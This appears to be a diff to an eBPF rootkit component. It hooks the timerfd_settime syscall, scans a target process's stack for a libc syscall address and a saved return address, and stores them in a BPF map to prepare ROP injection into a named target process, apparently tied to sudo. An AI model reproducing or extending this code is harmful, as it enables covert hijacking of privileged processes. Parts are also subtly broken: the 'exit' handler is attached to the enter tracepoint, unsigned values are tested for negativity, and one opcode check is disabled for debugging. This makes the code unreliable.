@@ -24,6 +24,13 @@ struct sys_timerfd_settime_enter_ctx {
     struct __kernel_itimerspec *otmr;
 };
 
+struct sys_timerfd_settime_exit_ctx {
+    unsigned long long unused; //Pointer to pt_regs
+    int __syscall_nr;
+    unsigned int padding; //Alignment
+    long ret;
+};
+
 /**
  * @brief Checks whether the format of the syscall is the expected one
  * 
@@ -32,8 +39,8 @@ struct sys_timerfd_settime_enter_ctx {
  * @return 0 if correct, 1 otherwise
  */
 static __always_inline int check_syscall_opcodes(__u8* opcodes){
-    return 0 == (opcodes[0]==0xf3
-        && opcodes[1]==0x0f
+    return 0 == (/*opcodes[0]==0xf3     //FOR GDB WORKING
+        &&*/ opcodes[1]==0x0f
         && opcodes[2]==0x1e
         && opcodes[3]==0xfa
         && opcodes[4]==0x49
@@ -107,6 +114,9 @@ static __always_inline int stack_extract_return_address_plt(__u64 stack){
         //the linker will place the address inside the shared library where the function is located.
         //More info in the documentation.
         __u64 got_addr;
+        if(j_addr==NULL){
+            return -1;
+        }
         bpf_probe_read_user(&got_addr, sizeof(__u64), j_addr);
         bpf_printk("GOT_ADDR: %lx\n",got_addr);
         //Now that we have the address placed in the GOT section we can finally go to the function in glibc
@@ -120,17 +130,23 @@ static __always_inline int stack_extract_return_address_plt(__u64 stack){
             bpf_printk("Not the expected syscall\n");
             return -1;
         }
-        //We got the expected syscall. We return the address at which we found it
+        
+        //We got the expected syscall.
         //We put it in an internal map.
         __u64 pid_tgid = bpf_get_current_pid_tgid();
-        __u32 pid = pid_tgid >> 32;
-        struct inj_ret_address_data *inj_ret_addr = (struct inj_ret_address_data*) bpf_map_lookup_elem(&inj_ret_address, &pid_tgid);
-        if (inj_ret_addr == NULL){
+        if(pid_tgid<0){
             return -1;
         }
-        struct inj_ret_address_data addr = *inj_ret_addr;
-        addr.pid = pid;
-        addr.stack_ret_address = (__u64)got_addr;
+        struct inj_ret_address_data *inj_ret_addr = (struct inj_ret_address_data*) bpf_map_lookup_elem(&inj_ret_address, &pid_tgid);
+        if (inj_ret_addr != NULL ){
+            //It means we have already performed this whole operation
+            return -1;
+        }
+
+        bpf_printk("Final found libc syscall address: %lx\n", got_addr);
+        struct inj_ret_address_data addr;
+        addr.libc_syscall_address = (__u64)got_addr;
+        addr.stack_ret_address = 0;
         bpf_map_update_elem(&inj_ret_address, &pid_tgid, &addr, BPF_ANY);
     }
     
@@ -140,7 +156,7 @@ static __always_inline int stack_extract_return_address_plt(__u64 stack){
 
 
 SEC("tp/syscalls/sys_enter_timerfd_settime")
-int sys_timerfd_settime(struct sys_timerfd_settime_enter_ctx *ctx){
+int sys_enter_timerfd_settime(struct sys_timerfd_settime_enter_ctx *ctx){
     __u64 *scanner = (__u64*)ctx->otmr;
     int fd = ctx->ufd;
 
@@ -165,10 +181,59 @@ int sys_timerfd_settime(struct sys_timerfd_settime_enter_ctx *ctx){
     for(__u64 ii=0; ii<100; ii++){
         bpf_probe_read(&address, sizeof(__u64), (void*)scanner - ii);
         //bpf_printk("stack: %lx\n", address);
-        stack_extract_return_address_plt(address);
+        if(stack_extract_return_address_plt(address)==0){
+            //We found the return address
+            __u64 found_return_address = *scanner - ii;
+            //We put it in an internal map.
+            __u64 pid_tgid = bpf_get_current_pid_tgid();
+            if(pid_tgid<0){
+                return -1;
+            }
+            struct inj_ret_address_data *inj_ret_addr = (struct inj_ret_address_data*) bpf_map_lookup_elem(&inj_ret_address, &pid_tgid);
+            if (inj_ret_addr == NULL ){
+                //It means we failed to insert into the map before
+                return -1;
+            }
+            struct inj_ret_address_data addr = *inj_ret_addr;
+            addr.stack_ret_address = (__u64)scanner - ii;
+            if(bpf_map_update_elem(&inj_ret_address, &pid_tgid, &addr, BPF_EXIST)<0){
+                bpf_printk("Failed to insert the return address in bpf map\n");
+                return -1;
+            }
+            bpf_printk("Final found return address: %lx\n", addr.stack_ret_address);
+            return 0;
+        }
     }
 
     
+
+
+    return 0;
+}
+
+SEC("tp/syscalls/sys_enter_timerfd_settime")
+int sys_exit_timerfd_settime(struct sys_timerfd_settime_exit_ctx *ctx){
+    char comm[TASK_COMM_LEN] = {0};
+    int err = bpf_get_current_comm(comm, sizeof(comm));
+    if(err<0){
+        return -1;
+    }
+    char *task = TASK_COMM_NAME_ROP_TARGET;
+    if(str_n_compare(comm, TASK_COMM_LEN, task, STRING_FS_SUDO_TASK_LEN, STRING_FS_SUDO_TASK_LEN) != 0){
+        return 0;
+    }
+    
+    //If we are here we may have the return address stored in the map.
+    __u64 pid_tgid = bpf_get_current_pid_tgid();
+    __u32 pid = pid_tgid >> 32;
+    struct inj_ret_address_data *inj_ret_addr = (struct inj_ret_address_data*) bpf_map_lookup_elem(&inj_ret_address, &pid_tgid);
+    if (inj_ret_addr == NULL){
+        //We failed to identify the return address in the previous probe.
+        return -1;
+    }
+
+    struct inj_ret_address_data addr = *inj_ret_addr;
+    bpf_printk("PID: %u, SYSCALL_ADDR: %lx, STACK_RET_ADDR: %lx", pid, addr.libc_syscall_address, addr.stack_ret_address);
 
 
     return 0;
